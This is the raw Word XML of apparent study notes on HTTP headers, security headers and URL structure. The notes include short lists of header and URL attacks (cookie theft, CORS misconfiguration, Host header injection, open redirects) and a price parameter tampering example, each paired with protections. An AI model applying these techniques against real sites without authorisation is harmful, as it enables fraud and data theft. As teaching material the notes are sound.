        <w:t>Host → The domain being requested (Host: example.com).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04C4BC67" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>User-Agent → Info about browser/device (Mozilla/5.0…).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A7C6083" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Accept → What content types the client accepts (text/html, application/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ACC34AE" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Authorization → Credentials for authentication (Basic, Bearer, etc.).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="270DAD89" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Cookie → Stores session data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52C72EB2" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Referer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> → From which page the request originated.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5738E8" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Accept-Language → Preferred language.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="332EF8BE" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Response Headers - Sent by the server back to the client.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C097069" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Server → Info about web server software (Apache/2.4.1).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012A2864" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Set-Cookie → Set cookies on client (sessions, tracking).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="495C394D" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Content-Type → Defines response format (text/html, application/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="720F28EB" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Content-Length → Size of response body.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AA1C4E5" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Location → Used for redirects (302 Found → Location: /login).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B0B530B" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Entity/Body Headers - Describe the body of the resource.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C7D9C45" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Content-Encoding → Compression type (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>gzip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>br</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E0E3A6" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Content-Language → Language of response.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038A3651" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Last-Modified → Timestamp when resource last changed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68528130" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="60" w:name="_Toc208408531"/>
      <w:r>
        <w:t>Security Header</w:t>
      </w:r>
      <w:bookmarkEnd w:id="60"/>
    </w:p>
    <w:p w14:paraId="4032FE61" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Strict-Transport-Security (HSTS) → Forces HTTPS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F55B74F" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>X-Frame-Options → Prevents Clickjacking (DENY, SAMEORIGIN).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16665D5E" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>X-Content-Type-Options → Prevents MIME sniffing (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nosniff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7018A8CD" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Content-Security-Policy (CSP) → Mitigates XSS by restricting scripts.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D10AF83" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Referrer-Policy → Controls how much referrer info is shared.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="042A3C4A" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Permissions-Policy → Controls access to features (camera, mic, geo).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6357948F" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="61" w:name="_Toc208408532"/>
      <w:r>
        <w:t>Vulnerabilities / Attacks Involving Headers</w:t>
      </w:r>
      <w:bookmarkEnd w:id="61"/>
    </w:p>
    <w:p w14:paraId="31EB1C33" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Cookie Theft → If </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>HttpOnly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> or Secure flags missing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A599BC" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Banner Grabbing → Server header reveals sensitive version info.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23078688" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CORS Misconfigurations → Access-Control-Allow-Origin: * → data theft.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72C0E2F3" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Host Header Injection → Manipulating Host for cache poisoning / redirects.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CCF726B" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Referrer Leakage → Sensitive info passed in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Referer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> header.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D6573AC" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="62" w:name="_Toc208408533"/>
      <w:r>
        <w:t>Protections</w:t>
      </w:r>
      <w:bookmarkEnd w:id="62"/>
    </w:p>
    <w:p w14:paraId="6813709D" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Set secure headers (HSTS, CSP, XFO, etc.).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD41CDD" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Remove or obfuscate Server header to avoid banner grabbing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00641E5C" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Configure cookies with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>HttpOnly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">, Secure, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>SameSite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BED5B42" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Implement strict CORS rules.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD2B06A" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Insecure Token Storage</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7273A984" w14:textId="77777777" w:rsidR="00C63726" w:rsidRDefault="00C63726" w:rsidP="00C63726">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="608F3D30" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRPr="00E270C8" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="63" w:name="_Toc208408534"/>
      <w:r>
        <w:t>Uniform Resource Locator (URL)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="63"/>
    </w:p>
    <w:p w14:paraId="722B52D3" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A URL is a string reference (address) that specifies the location of a resource on the Internet and the mechanism to access it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03156CC1" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>It is essentially the address of a resource (like a webpage, file, or API endpoint).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F9E494" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="64" w:name="_Toc208408535"/>
      <w:r>
        <w:t>Structure of URL</w:t>
      </w:r>
      <w:bookmarkEnd w:id="64"/>
    </w:p>
    <w:p w14:paraId="58098DD3" w14:textId="57319FF6" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="60A9F908" wp14:editId="24A8256C">
            <wp:extent cx="5486400" cy="1978025"/>
            <wp:effectExtent l="0" t="0" r="0" b="3175"/>
            <wp:docPr id="631795951" name="Picture 13" descr="9 Parts of a URL You Should Know. if you plan on building a website | by  Joseph Pyr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9 Parts of a URL You Should Know. if you plan on building a website | by  Joseph Pyram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978025"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7F026D" w14:textId="77777777" w:rsidR="00BC35DD" w:rsidRPr="00BC35DD" w:rsidRDefault="00BC35DD" w:rsidP="00BC35DD"/>
    <w:p w14:paraId="78C2F202" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="65" w:name="_Toc208408536"/>
      <w:r>
        <w:t>Components</w:t>
      </w:r>
      <w:bookmarkEnd w:id="65"/>
    </w:p>
    <w:p w14:paraId="69CB2B50" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Scheme (Protocol)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32498E2E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>e.g., http, https, ftp, mailto</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AE046B0" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Defines how the resource is accessed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1904AED3" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>User Info (optional)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B382CE" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>user:password</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>@</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78AE14D7" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Legacy authentication (now insecure).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49626D8C" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Host (Domain or IP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60116DFF" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>e.g., www.example.com, 192.168.1.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B5BD2F" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Identifies the server hosting the resource.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32277CFB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Port (optional)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF278E9" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>e.g., :8080</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04154051" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Default ports (80 for HTTP, 443 for HTTPS) may be omitted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E510358" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44FA2F58" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>e.g., /path/page.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF71DC8" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Location of the resource on the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3E6131" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Query String (Parameters)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57235EFB" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>e.g., ?search=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>chatgpt&amp;lang</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="02FF9648" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Key-value pairs for dynamic data.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22350C7E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Fragment (Anchor)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="682D0A6D" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>e.g., #section2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F5E179" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Points to a section within the resource (client-side only).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD7ABAF" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="66" w:name="_Toc208408537"/>
      <w:r>
        <w:t>Vulnerabilities</w:t>
      </w:r>
      <w:bookmarkEnd w:id="66"/>
    </w:p>
    <w:p w14:paraId="65E23269" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>URL Manipulation / Parameter Tampering</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B4DE2E" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Example: ?price=100 → changed to ?price=1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02BC641B" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Open Redirects</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="105907AC" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="00E270C8">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Attacker tricks user into visiting malicious sites by redirecting through vulnerable domain.</w:t>
      </w:r>
    </w:p>
